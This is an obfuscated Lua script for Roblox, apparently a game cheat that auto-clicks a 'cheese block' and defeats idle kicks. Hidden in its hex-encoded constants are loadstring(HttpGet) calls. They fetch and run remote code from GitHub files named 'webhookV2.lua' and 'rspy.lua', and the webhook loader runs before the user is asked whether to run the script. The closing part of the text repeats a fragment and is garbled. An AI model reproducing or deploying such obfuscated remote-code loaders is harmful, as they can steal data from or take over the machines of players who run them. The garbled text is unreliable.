return v15("LOL!263Q0003043Q0067616D6503073Q00506C6163654964022Q005028BDC0024203083Q0049734C6F6164656403063Q004C6F6164656403043Q005761697403083Q00496E7374616E63652Q033Q006E657703103Q0042696E6461626C6546756E6374696F6E03083Q004F6E496E766F6B65028Q00026Q00F03F03053Q007063612Q6C03053Q007072696E74031B3Q00536372697074206C6F616465642073752Q63652Q7366752Q6C792103043Q007761726E031A3Q004661696C656420746F206C6F616420746865207363726970743A030A3Q006C6F6164737472696E6703073Q00482Q747047657403573Q00682Q7470733A2Q2F7261772E67697468756275736572636F6E74656E742E636F6D2F49736E6F74616C77692F526F626C6F782D5363726970742F726566732F68656164732F6D61696E2F776562682Q6F6B56322E6C7561030A3Q0047657453657276696365030A3Q005374617274657247756903073Q00536574436F726503103Q0053656E644E6F74696669636174696F6E03053Q005469746C6503073Q004E4F544943452103043Q005465787403183Q00446F20796F752072756E2074686973207363746970742Q3F03083Q004475726174696F6E03043Q006D61746803043Q006875676503073Q0042752Q746F6E312Q033Q0059657303073Q0042752Q746F6E3203023Q004E6F03043Q0049636F6E031B3Q00726278612Q73657469643A2Q2F393236333937353031303139343803083Q0043612Q6C6261636B004B3Q0012413Q00013Q00200F5Q000200262B3Q004A0001000300043F3Q004A00010012413Q00013Q00203E5Q00042Q00213Q0002000200062A3Q000D0001000100043F3Q000D00010012413Q00013Q00200F5Q000500203E5Q00062Q00223Q000200010012413Q00073Q00200F5Q0008001208000100094Q00213Q0002000200022D00015Q0010153Q000A00010012080001000B4Q0002000200043Q00262B0001002C0001000C00043F3Q002C00012Q0002000400043Q00262B000200180001000B00043F3Q001800010012410005000D3Q00022D000600014Q003B0005000200062Q001D000400064Q001D000300053Q0006420003002500013Q00043F3Q002500010012410005000E3Q0012080006000F4Q002200050002000100043F3Q00320001001241000500103Q001208000600114Q001D000700044Q003000050007000100043F3Q0032000100043F3Q0018000100043F3Q0032000100262B000100150001000B00043F3Q001500010012080002000B4Q0002000300033Q0012080001000C3Q00043F3Q00150001001241000100123Q001241000200013Q00203E000200020013001208000400144Q001C000200044Q002F00013Q00022Q0034000100010001001241000100013Q00203E000100010015001208000300164Q002C00010003000200203E000100010017001208000300184Q000500043Q000700304000040019001A0030400004001B001C0012410005001E3Q00200F00050005001F0010150004001D0005003040000400200021003040000400220023003040000400240025001015000400264Q00300001000400012Q00163Q00013Q00023Q00123Q002Q033Q00596573028Q00026Q00F03F03073Q0067657467656E7603023Q00596F2Q0103043Q007461736B03043Q007761697403053Q00737061776E03043Q0067616D65030A3Q0047657453657276696365030B3Q005669727475616C5573657203073Q00506C6179657273030B3Q004C6F63616C506C6179657203053Q0049646C656403073Q00436F2Q6E65637403023Q004E6F03083Q0053687574646F776E01313Q00262B3Q002B0001000100043F3Q002B0001001208000100024Q0002000200023Q00262B000100160001000300043F3Q00160001001241000300046Q000300010002003040000300050006001241000300053Q0006420003002900013Q00043F3Q00290001001241000300073Q00200F0003000300084Q0003000100020006420003002900013Q00043F3Q00290001001241000300093Q00022D00046Q002200030002000100043F3Q0009000100043F3Q0029000100262B000100040001000200043F3Q000400010012410003000A3Q00203E00030003000B0012080005000C4Q002C0003000500022Q001D000200033Q0012410003000A3Q00203E00030003000B0012080005000D4Q002C00030005000200200F00030003000E00200F00030003000F00203E00030003001000063500050001000100012Q00433Q00024Q0030000300050001001208000100033Q00043F3Q000400012Q002600015Q00043F3Q0030000100262B3Q00300001001100043F3Q003000010012410001000A3Q00203E0001000100122Q00220001000200012Q00163Q00013Q00023Q000A3Q0003063Q0069706169727303043Q0067616D65030A3Q004765745365727669636503093Q00576F726B7370616365030C3Q0063682Q65736520626C6F636B030E3Q0047657444657363656E64616E74732Q033Q00497341030D3Q00436C69636B4465746563746F7203043Q007461736B03053Q00737061776E00183Q0012413Q00013Q001241000100023Q00203E000100010003001208000300044Q002C00010003000200200F00010001000500203E0001000100062Q001E000100024Q00315Q000200043F3Q0015000100203E000500040007001208000700084Q002C0005000700020006420005001400013Q00043F3Q00140001001241000500093Q00200F00050005000A00063500063Q000100012Q00433Q00044Q00220005000200012Q002600035Q00061F3Q000A0001000200043F3Q000A00012Q00163Q00013Q00013Q00013Q0003113Q0066697265636C69636B6465746563746F7200043Q0012413Q00014Q003700016Q00223Q000200012Q00163Q00017Q00053Q00028Q0003113Q0043617074757265436F6E74726F2Q6C6572030C3Q00436C69636B42752Q746F6E3203073Q00566563746F72322Q033Q006E6577000F3Q0012083Q00013Q00262B3Q00010001000100043F3Q000100012Q003700015Q00203E0001000100022Q00220001000200012Q003700015Q00203E000100010003001241000300043Q00200F0003000300052Q0010000300014Q004500013Q000100043F3Q000E000100043F3Q000100012Q00163Q00017Q00043Q00030A3Q006C6F6164737472696E6703043Q0067616D6503073Q00482Q747047657403503Q00682Q7470733A2Q2F7261772E67697468756275736572636F6E74656E742E636F6D2F496D616C7769626573742F496D616C7769626573742F726566732F68656164732F6D61696E2F727370792E6C7561000A3Q0012413Q00013Q001241000100023Q00203E000100010003001208000300044Q0028000400014Q001C000100044Q002F5Q00022Q00293Q00014Q00048Q00163Q00017Q00", v9(), ...);00F3Q0012083Q00013Q00262B3Q00010001000100043F3Q000100012Q003700015Q00203E0001000100022Q00220001000200012Q003700015Q00203E000100010003001241000300043Q00200F0003000300052Q0010000300014Q004500013Q000100043F3Q000E000100043F3Q000100012Q00163Q00017Q00043Q00030A3Q006C6F6164737472696E6703043Q0067616D6503073Q00482Q747047657403503Q00682Q7470733A2Q2F7261772E67697468756275736572636F6E74656E742E636F6D2F496D616C7769626573742F496D616C7769626573742F726566732F68656164732F6D61696E2F727370792E6C7561000A3Q0012413Q00013Q001241000100023Q00203E000100010003001208000300044Q0028000400014Q001C000100044Q002F5Q00022Q00293Q00014Q00048Q00163Q00017Q00", v9(), ...);
